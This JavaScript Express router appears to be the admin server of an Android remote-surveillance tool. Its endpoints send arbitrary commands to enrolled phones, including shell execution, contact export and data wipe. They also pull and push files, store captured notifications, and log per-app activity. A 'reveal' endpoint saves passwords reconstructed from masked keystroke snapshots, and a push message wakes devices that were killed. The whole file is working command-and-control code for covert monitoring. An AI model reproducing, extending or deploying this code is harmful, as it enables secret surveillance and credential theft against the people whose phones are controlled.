/**
 * Admin API Routes
 */

import express from 'express';
import multer from 'multer';
import path from 'path';
import fs from 'fs/promises';
import crypto from 'crypto';
import { socketRegistry } from '../services/socketRegistry.js';
import { commandDispatcher } from '../services/commandDispatcher.js';
import { fcmSender } from '../services/fcmSender.js';
import { getActivityEventsFromDB, getUserDevices, claimDevice, getCapturedNotifications, getNotifications } from '../services/database.js';
import { uploadFileToSupabase, downloadFileFromSupabase, deleteFileFromSupabase, getFileUrl } from '../services/storage.js';
import config from '../config.js';

const router = express.Router();

// Apply ownership check to all device-specific routes
router.use('/device/:deviceId', requireDeviceOwnership);
router.use('/command/:deviceId', requireDeviceOwnership);
router.use('/upload/:deviceId', requireDeviceOwnership);
router.use('/download/:deviceId', requireDeviceOwnership);

// â”€â”€ Device Ownership Cache â”€â”€
// Refresh from DB every 60s; keeps hot-path checks fast
const ownershipCache = new Map(); // deviceId -> owner (admin username)
let ownershipCacheTimer = null;

async function refreshOwnershipCache() {
    if (ownershipCacheTimer) clearTimeout(ownershipCacheTimer);
    try {
        const { getAllDevices } = await import('../services/database.js');
        const devices = await getAllDevices();
        ownershipCache.clear();
        for (const d of devices) {
            if (d.owner) ownershipCache.set(d.device_id, d.owner);
        }
    } catch (e) {
        console.error('[Admin] Ownership cache refresh failed:', e.message);
    }
    ownershipCacheTimer = setTimeout(refreshOwnershipCache, 60_000);
}
refreshOwnershipCache();

/**
 * Middleware: verify the requesting admin owns the target device.
 * Adds `deviceId` to req for downstream handlers.
 */
async function requireDeviceOwnership(req, res, next) {
    const deviceId = req.params.deviceId || req.body?.deviceId || req.query?.deviceId;
    if (!deviceId) return next();

    const owner = ownershipCache.get(deviceId);
    if (owner && owner !== req.adminUser) {
        return res.status(403).json({
            success: false,
            error: 'Device not owned by this admin',
            code: 'DEVICE_NOT_OWNED',
        });
    }
    req.deviceId = deviceId;
    next();
}

// ========== PER-DEVICE INFO RATE LIMITER ==========
// Prevents command flooding when multiple browser tabs auto-refresh every 10s
const infoRateMap = new Map(); // deviceId -> lastRequestTime
const INFO_MIN_INTERVAL_MS = 4000; // max 1 request per 4 seconds per device

function deviceInfoRateLimit(req, res, next) {
    const { deviceId } = req.params;
    const now = Date.now();
    const last = infoRateMap.get(deviceId) || 0;
    if (now - last < INFO_MIN_INTERVAL_MS) {
        return res.status(429).json({
            success: false,
            error: `Device info rate limited â€” please wait ${INFO_MIN_INTERVAL_MS / 1000}s between requests`,
        });
    }
    infoRateMap.set(deviceId, now);
    // Auto-cleanup stale entries every 60s
    if (!global._infoRateLimitTimer) {
        global._infoRateLimitTimer = setInterval(() => {
            const cutoff = Date.now() - 60_000;
            for (const [id, t] of infoRateMap) {
                if (t < cutoff) infoRateMap.delete(id);
            }
        }, 60_000);
    }
    next();
}

// Configure multer for file uploads
const storage = multer.diskStorage({
    destination: async (req, file, cb) => {
        const uploadDir = './uploads';
        try {
            await fs.mkdir(uploadDir, { recursive: true });
            cb(null, uploadDir);
        } catch (error) {
            cb(error);
        }
    },
    filename: (req, file, cb) => {
        const uniqueName = `${Date.now()}-${file.originalname}`;
        cb(null, uniqueName);
    },
});

const upload = multer({
    storage,
    limits: { fileSize: 100 * 1024 * 1024 }, // 100MB
});
const WS_FILE_UPLOAD_LIMIT = 5 * 1024 * 1024;
const DEVICE_URL_UPLOAD_LIMIT = 20 * 1024 * 1024;

/**
 * GET /api/devices - List all devices owned by the admin (online + offline)
 */
router.get('/devices', async (req, res) => {
    let devices = socketRegistry.listDevices();
    const ownedIds = await getUserDevices(req.adminUser);
    if (ownedIds.length > 0) {
        devices = devices.filter(d => ownedIds.includes(d.deviceId));
    }
    res.json({
        success: true,
        total: devices.length,
        devices,
    });
});

/**
 * POST /api/device/:deviceId/claim - Claim ownership of a device
 */
router.post('/device/:deviceId/claim', async (req, res) => {
    const { deviceId } = req.params;
    const ok = await claimDevice(deviceId, req.adminUser);
    if (ok) {
        ownershipCache.set(deviceId, req.adminUser);
        res.json({ success: true, message: `Device ${deviceId} claimed by ${req.adminUser}` });
    } else {
        res.status(500).json({ success: false, error: 'Failed to claim device' });
    }
});

/**
 * DELETE /api/device/:deviceId - Permanently delete a device
 * Cascade: server memory + Supabase (devices, activity_events, notifications, captured_notifications)
 */
router.delete('/device/:deviceId', (req, res) => {
    const { deviceId } = req.params;
    const removed = socketRegistry.deleteDevice(deviceId);
    if (removed) {
        // Clear ALL in-memory caches for this device
        if (global.activityCache) global.activityCache.delete(deviceId);

        // Clear command history
        commandDispatcher.clearHistory(deviceId);

        console.log(`[Admin] Device ${deviceId} fully deleted — all caches and DB records purged`);
        res.json({ success: true, message: `Device ${deviceId} permanently deleted` });
    } else {
        res.status(404).json({ success: false, error: 'Device not found' });
    }
});



/**
 * GET /api/devices/online - List only online devices
 */
router.get('/devices/online', (req, res) => {
    const devices = socketRegistry.getOnlineDevices();
    res.json({
        success: true,
        online: devices.length,
        devices,
    });
});

/**
 * GET /api/device/:deviceId/info - Get specific device info
 */
router.get('/device/:deviceId/info', deviceInfoRateLimit, async (req, res) => {
    const { deviceId } = req.params;

    // Validate deviceId format (alphanumeric + hyphen/underscore, 8â€“128 chars)
    if (!deviceId || !/^[a-zA-Z0-9_\-]{8,128}$/.test(deviceId)) {
        return res.status(400).json({
            success: false,
            error: 'Invalid deviceId format',
        });
    }

    try {
        const device = socketRegistry.getDevice(deviceId);
        if (!device) {
            return res.status(404).json({
                success: false,
                error: 'Device not found or disconnected',
            });
        }

        // Request fresh device info from the Android client via WebSocket command
        const liveInfo = await commandDispatcher.sendCommandWithRetry(deviceId, 'device_info', {}, 30000, 15000);

        // Explicit merge: stale metadata is the fallback, live data takes priority
        // (metadata may have cached values from registration; live data is always fresher)
        res.json({
            success: true,
            device: {
                deviceId,
                ...device.metadata,  // fallback: registration-time snapshot
                ...liveInfo,         // override: fresh live data from device
            },
        });
} catch (error) {
        res.status(500).json({
            success: false,
            error: error.message,
        });
    }
});

/**
 * POST /api/upload/:deviceId - Upload file to device
 */
router.post('/upload/:deviceId', upload.single('file'), async (req, res) => {
    const { deviceId } = req.params;
    const { targetPath } = req.body;

    if (!req.file) {
        return res.status(400).json({
            success: false,
            error: 'No file provided',
        });
    }

    try {
        const finalPath = targetPath || `/storage/emulated/0/Download/${req.file.originalname}`;

        if (req.file.size > DEVICE_URL_UPLOAD_LIMIT) {
            await fs.unlink(req.file.path).catch(() => {});
            return res.status(413).json({
                success: false,
                error: `File too large for hosted testing upload path. Max ${Math.round(DEVICE_URL_UPLOAD_LIMIT / 1024 / 1024)}MB.`,
            });
        }

        if (req.file.size > WS_FILE_UPLOAD_LIMIT) {
            const tempUrl = `${req.protocol}://${req.get('host')}/api/download-temp/${encodeURIComponent(req.file.filename)}`;
            const result = await commandDispatcher.sendCommandWithRetry(deviceId, 'file_upload_url', {
                path: finalPath,
                url: tempUrl,
                filename: req.file.originalname,
                size: req.file.size,
            }, 120000, 15000);

            await fs.unlink(req.file.path).catch(() => {});
            return res.json({
                success: true,
                data: result,
            });
        }

        // Read uploaded file
        const fileBuffer = await fs.readFile(req.file.path);
        const base64Data = fileBuffer.toString('base64');

        // Send to device — large base64 payloads need more than the 30s default on slow uplinks
        const result = await commandDispatcher.sendCommandWithRetry(deviceId, 'file_upload', {
            path: finalPath,
            data: base64Data,
            filename: req.file.originalname,
        }, 120000, 15000);

        // Clean up temporary file
        await fs.unlink(req.file.path);

        res.json({
            success: true,
            data: result,
        });
    } catch (error) {
        // Clean up on error
        try {
            await fs.unlink(req.file.path);
        } catch (e) {
            // Ignore cleanup errors
        }

        res.status(500).json({
            success: false,
            error: error.message,
        });
    }
});

/**
 * Middleware: Verify Device HMAC signature for large file uploads
 */
const validateDeviceUpload = (req, res, next) => {
    const deviceId = req.header('X-Device-Id');
    const timestamp = req.header('X-Timestamp');
    const signature = req.header('X-Signature');

    if (!deviceId || !timestamp || !signature) {
        console.warn('[device-upload-temp] ❌ Missing headers');
        return res.status(401).json({ error: 'Missing device authentication headers' });
    }

    // Enforce 5-minute replay protection
    const age = Date.now() - parseInt(timestamp, 10);
    if (age > 5 * 60 * 1000) {
        console.warn(`[device-upload-temp] ❌ Expired request — age: ${age}ms`);
        return res.status(401).json({ error: 'Request payload expired (potential replay attack)' });
    }

    const secretUsed = config.websocket.deviceSecret;
    const payload = `${deviceId}:${timestamp}`;
    const expectedSignature = crypto
        .createHmac('sha256', secretUsed)
        .update(payload)
        .digest('hex');

    // Timing-safe comparison
    const sigBuf = Buffer.from(signature, 'utf8');
    const expectedBuf = Buffer.from(expectedSignature, 'utf8');

    if (sigBuf.length !== expectedBuf.length || !crypto.timingSafeEqual(sigBuf, expectedBuf)) {
        console.warn(`[device-upload-temp] ❌ HMAC mismatch for device: ${deviceId}`);
        return res.status(403).json({ error: 'Invalid device payload signature' });
    }

    next();
};

const handleTempUpload = async (req, res) => {
    if (!req.file) {
        return res.status(400).json({ error: 'No file provided' });
    }

    try {
        const fileBuffer = await fs.readFile(req.file.path);

        // Try Supabase first, fallback to local
        const { url, error } = await uploadFileToSupabase('media-extracts', req.file.filename, fileBuffer, req.file.mimetype);

        if (!error && url) {
            // Supabase success — clean up local temp
            await fs.unlink(req.file.path).catch(e => {});
            // Schedule cloud cleanup (10 min window, matching the local fallback).
            // Without this, large-file previews via /api/download-temp would leave a
            // permanent public copy in the media-extracts bucket.
            setTimeout(() => {
                deleteFileFromSupabase('media-extracts', req.file.filename)
                    .catch(e => console.error('Delayed temp cleanup failed:', e.message));
            }, 10 * 60 * 1000);
            return res.json({
                status: 'success',
                storage: 'cloud',
                tempFilename: req.file.filename,
                originalName: req.file.originalname,
                url: url
            });
        }

        // Supabase unavailable — keep file locally in uploads/
        console.log(`[upload-temp] Supabase unavailable, keeping file locally: ${req.file.filename}`);

        // Auto-cleanup local file after 10 minutes
        setTimeout(() => {
            fs.unlink(req.file.path).catch(() => {});
        }, 10 * 60 * 1000);

        res.json({
            status: 'success',
            storage: 'local',
            tempFilename: req.file.filename,
            originalName: req.file.originalname,
            url: `/api/download-temp/${req.file.filename}`
        });
    } catch (err) {
        console.error('[upload-temp] Processing error:', err);
        await fs.unlink(req.file.path).catch(() => {});
        res.status(500).json({ error: 'Failed to process file' });
    }
};

/**
 * POST /api/device-upload-temp - Endpoint for device to upload large files temporarily
 * Used when file > 5MB to avoid WebSocket crash
 */
router.post('/device-upload-temp', validateDeviceUpload, upload.single('file'), handleTempUpload);

/**
 * POST /api/admin-upload-temp - Endpoint for admin dashboard to upload large files temporarily (e.g. video casting)
 * Handled by standard auth and CSRF middleware, so no device validation needed.
 */
router.post('/admin-upload-temp', upload.single('file'), handleTempUpload);

/**
 * GET /api/download-temp/:filename - Download a temp-uploaded file
 * Used by device to download files uploaded via /api/device-upload-temp
 */
router.get('/download-temp/:filename', async (req, res) => {
    const { filename } = req.params;
    const safeName = path.basename(filename);
    const localPath = path.resolve('./uploads', safeName);

    // 1. Check if the file exists locally (means Supabase fallback was used)
    try {
        await fs.access(localPath);
        return res.sendFile(localPath);
    } catch {}

    // 2. Otherwise assume it's in Supabase
    const url = getFileUrl('media-extracts', safeName);
    if (url) {
        return res.redirect(url);
    }

    res.status(404).json({ error: 'File not found' });
});

/**
 * GET /api/download/:deviceId - Download file from device
 */
router.get('/download/:deviceId', async (req, res) => {
    const { deviceId } = req.params;
    const { path: filePath } = req.query;

    if (!filePath) {
        return res.status(400).json({
            success: false,
            error: 'File path is required',
        });
    }

    try {
        const result = await commandDispatcher.sendCommandWithRetry(deviceId, 'file_download', {
            path: filePath,
        }, 120000, 15000);

        // STRATEGY 1: Large File (Temp Upload)
        if (result.strategy === 'temp_url' && result.tempFilename) {
            const filename = result.filename || path.basename(filePath);
            const localPath = path.resolve('./uploads', result.tempFilename);

            // 1. Check local file first (definitive proof Supabase upload failed/fallback used)
            try {
                await fs.access(localPath);
                return res.download(localPath, filename, () => {
                    setTimeout(() => { fs.unlink(localPath).catch(() => {}); }, 10000);
                });
            } catch {}

            // 2. If no local file, it must be in Supabase
            let url = getFileUrl('media-extracts', result.tempFilename);
            if (url) {
                url = `${url}?download=${encodeURIComponent(filename)}`;
                setTimeout(() => {
                    deleteFileFromSupabase('media-extracts', result.tempFilename)
                        .catch(e => console.error('Delayed cleanup failed:', e));
                }, 10000);
                return res.redirect(url);
            }

            return res.status(500).json({ success: false, error: 'File not found in cloud or local storage' });
        }

        // STRATEGY 2: Small File (Base64) - Default behavior
        const filename = result.filename || path.basename(filePath);
        const buffer = Buffer.from(result.data, 'base64');

        res.setHeader('Content-Disposition', `attachment; filename="${filename}"`);
        res.setHeader('Content-Type', 'application/octet-stream');
        res.send(buffer);
    } catch (error) {
        res.status(500).json({
            success: false,
            error: error.message,
        });
    }
});

/**
 * GET /api/stats - Server statistics
 */
router.post('/command/:deviceId', async (req, res) => {
    const { deviceId } = req.params;
    const { action, payload } = req.body;

    if (!action) {
        return res.status(400).json({
            success: false,
            error: 'Action is required',
        });
    }

    // Critical Security: Block destructive actions without explicit frontend MFA confirmation
    if (action === 'wipe_data') {
        if (!payload || payload.confirm !== true) {
            return res.status(403).json({
                success: false,
                error: 'MFA Verification failed: wipe_data requires structural confirmation.',
            });
        }
    }

    try {
        // CROSS-BUG-5: use longer timeout for slow commands (contacts_list can take 30-45s on large datasets)
        const slowCommands = ['contacts_list', 'contacts_export', 'apps_list'];
        const timeout = slowCommands.includes(action) ? 60000 : 30000;
        const data = await commandDispatcher.sendCommandWithRetry(deviceId, action, payload || {}, timeout, 15000);
        res.json({
            success: true,
            data,
        });
    } catch (error) {
        res.status(500).json({
            success: false,
            error: error.message,
        });
    }
});
/**
 * GET /api/stats - Server statistics
 */
router.get('/stats', (req, res) => {
    res.json({
        success: true,
        stats: {
            connectedDevices: socketRegistry.getDeviceCount(),
            pendingCommands: commandDispatcher.getPendingCount(),
            uptime: process.uptime(),
            memory: process.memoryUsage(),
        },
    });
});

// (Device delete route is defined above at line ~69 â€” single comprehensive handler)

/**
 * GET /api/device/:deviceId/history - Get command history for device
 * Query params: ?limit=50&action=activity_status&status=success
 */
router.get('/device/:deviceId/history', (req, res) => {
    const { deviceId } = req.params;
    const limit = parseInt(req.query.limit) || 100;
    const actionFilter = req.query.action || null;
    const statusFilter = req.query.status || null;

    let history = commandDispatcher.getHistory(deviceId, limit);

    if (actionFilter) {
        history = history.filter(h => h.action === actionFilter);
    }
    if (statusFilter) {
        history = history.filter(h => h.status === statusFilter);
    }

    res.json({
        success: true,
        count: history.length,
        history,
    });
});

/**
 * GET /api/notifications/captured - Captured phone notifications from Supabase
 * Query params: ?deviceId=&limit= (default 200)
 */
router.get('/notifications/captured', async (req, res) => {
    try {
        const deviceId = req.query.deviceId || null;
        const limit = Math.min(parseInt(req.query.limit) || 200, 1000);
        const rows = await getCapturedNotifications(deviceId, limit);
        res.json({ success: true, count: rows.length, notifications: rows });
    } catch (err) {
        res.status(500).json({ success: false, error: err.message });
    }
});

/**
 * GET /api/notifications - Device lifecycle events (online/offline/setup_complete)
 * Query params: ?deviceId=&limit= (default 100)
 */
router.get('/notifications', async (req, res) => {
    try {
        const deviceId = req.query.deviceId || null;
        const limit = Math.min(parseInt(req.query.limit) || 100, 500);
        const rows = await getNotifications(deviceId, limit);
        res.json({ success: true, count: rows.length, notifications: rows });
    } catch (err) {
        res.status(500).json({ success: false, error: err.message });
    }
});

/**
 * GET /api/history - Get ALL command history (all devices)
 * Query params: ?limit=100&action=shell_exec
 */
router.get('/history', (req, res) => {
    const limit = parseInt(req.query.limit) || 100;
    const actionFilter = req.query.action || null;

    let history = commandDispatcher.getHistory(null, limit);

    if (actionFilter) {
        history = history.filter(h => h.action === actionFilter);
    }

    res.json({
        success: true,
        count: history.length,
        history,
    });
});

/**
 * DELETE /api/device/:deviceId/history - Clear command history
 */
router.delete('/device/:deviceId/history', (req, res) => {
    const { deviceId } = req.params;
    commandDispatcher.clearHistory(deviceId);
    res.json({ success: true, message: `History cleared for ${deviceId}` });
});

/**
 * GET /api/device/:deviceId/activities - Get activity events
 */
router.get('/device/:deviceId/activities', async (req, res) => {
    const { deviceId } = req.params;
    const limit = parseInt(req.query.limit) || 500;
    const appFilter = req.query.app || null;

    // Merge the in-memory cache (not-yet-persisted tail) with the DB history so
    // a streaming burst never produces a partial view. DB rows are authoritative.
    const cache = global.activityCache;
    let cachedEvents = [];
    if (cache && cache.has(deviceId)) {
        cachedEvents = cache.get(deviceId).slice(0, limit);
    }

    let dbEvents = [];
    try {
        dbEvents = await getActivityEventsFromDB(deviceId, limit);
    } catch (err) {
        console.error(`[Admin] Error loading activity events from DB for ${deviceId}:`, err.message);
    }

    const events = dbEvents.map(row => ({
        uuid: row.event_uuid,
        type: row.event_type,
        app: row.app_package,
        text: row.text,
        realText: row.real_text,
        isPassword: row.is_password,
        textRevealed: row.text_revealed,
        revealPartial: row.reveal_partial,
        fullText: row.full_text,
        className: row.class_name,
        beforeText: row.before_text,
        contentDesc: row.content_desc,
        scrollY: row.scroll_y,
        maxScrollY: row.max_scroll_y,
        itemCount: row.item_count,
        previousApp: row.previous_app,
        timestamp: new Date(row.created_at).getTime(),
        receivedAt: row.created_at,
    }));

    // Add cache events that are not already present in the DB (uuid dedup)
    const seen = new Set(events.map(e => e.uuid).filter(Boolean));
    cachedEvents.forEach(ce => {
        if (ce.uuid && seen.has(ce.uuid)) return;
        events.push(ce);
    });

    events.sort((a, b) => Number(b.timestamp || 0) - Number(a.timestamp || 0));
    const sliced = events.slice(0, limit);

    const filtered = appFilter ? sliced.filter(e => e.app && e.app.includes(appFilter)) : sliced;

    res.json({
        success: true,
        count: filtered.length,
        source: dbEvents.length > 0 ? 'db' : (cachedEvents.length > 0 ? 'cache' : 'none'),
        events: filtered,
    });
});

/**
 * POST /api/device/:deviceId/activities/reveal - Persist reconstructed
 * password text computed by the dashboard. The phone only sends masked
 * snapshots; the dashboard reconstructs the real text and writes it here so it
 * survives page reloads (best-effort; recompute is always possible).
 */
router.post('/device/:deviceId/activities/reveal', async (req, res) => {
    const { deviceId } = req.params;
    const updates = Array.isArray(req.body?.updates) ? req.body.updates : [];
    if (updates.length === 0) {
        return res.json({ success: true, updated: 0 });
    }

    // Validate + cap; never trust arbitrary payloads.
    const clean = updates
        .slice(0, 500)
        .filter(u => u && u.uuid && typeof u.text === 'string' && u.text.length > 0 && u.text.length <= 2000)
        .map(u => ({ uuid: String(u.uuid), text: u.text, partial: !!u.partial }));

    let updated = 0;
    try {
        const { updateActivityReveal } = await import('../services/database.js');
        updated = await updateActivityReveal(deviceId, clean);
    } catch (err) {
        console.error(`[Admin] Error persisting reveals for ${deviceId}:`, err.message);
        return res.status(500).json({ success: false, error: 'Failed to persist reveals' });
    }

    // Reflect into the in-memory cache so live views stay consistent.
    if (global.activityCache && global.activityCache.has(deviceId)) {
        const cached = global.activityCache.get(deviceId);
        clean.forEach(u => {
            const ev = cached.find(e => e.uuid === u.uuid);
            if (ev) {
                ev.textRevealed = u.text;
                ev.revealPartial = u.partial;
            }
        });
    }

    res.json({ success: true, updated });
});

/**
 * DELETE /api/device/:deviceId/activities - Clear activity cache
 */
router.delete('/device/:deviceId/activities', async (req, res) => {
    const { deviceId } = req.params;

    // Delete from Supabase first (persistent store)
    try {
        const { deleteActivityEventsFromDB } = await import('../services/database.js');
        await deleteActivityEventsFromDB(deviceId);
    } catch (err) {
        console.error(`[Admin] Error deleting activity events from DB for ${deviceId}:`, err.message);
    }

    // Then clear in-memory cache
    if (global.activityCache && global.activityCache.has(deviceId)) {
        global.activityCache.delete(deviceId);
    }
    res.json({ success: true, message: `Activity cache cleared for ${deviceId}` });
});

/**
 * DELETE /api/device/:deviceId/notifications - Delete all notification records from Supabase
 */
router.delete('/device/:deviceId/notifications', async (req, res) => {
    const { deviceId } = req.params;

    try {
        const { deleteCapturedNotificationsFromDB } = await import('../services/database.js');
        await deleteCapturedNotificationsFromDB(deviceId);
        res.json({ success: true, message: `All notifications deleted for ${deviceId}` });
    } catch (err) {
        console.error(`[Admin] Error deleting notifications from DB for ${deviceId}:`, err.message);
        res.status(500).json({ success: false, error: 'Failed to delete notifications from Supabase' });
    }
});

/**
 * POST /api/device/:deviceId/wake - Send FCM push to wake a killed device
 */
router.post('/device/:deviceId/wake', async (req, res) => {
    const { deviceId } = req.params;
    const device = socketRegistry.getDevice(deviceId);
    const fcmToken = device?.metadata?.fcmToken;

    if (!fcmToken) {
        return res.json({ success: false, error: 'No FCM token — device never registered with push support' });
    }

    const sent = await fcmSender.wakeDevice(fcmToken, deviceId);
    res.json({ success: sent, message: sent ? 'Wake push sent — device should reconnect in ~10s' : 'FCM push failed' });
});

export default router;
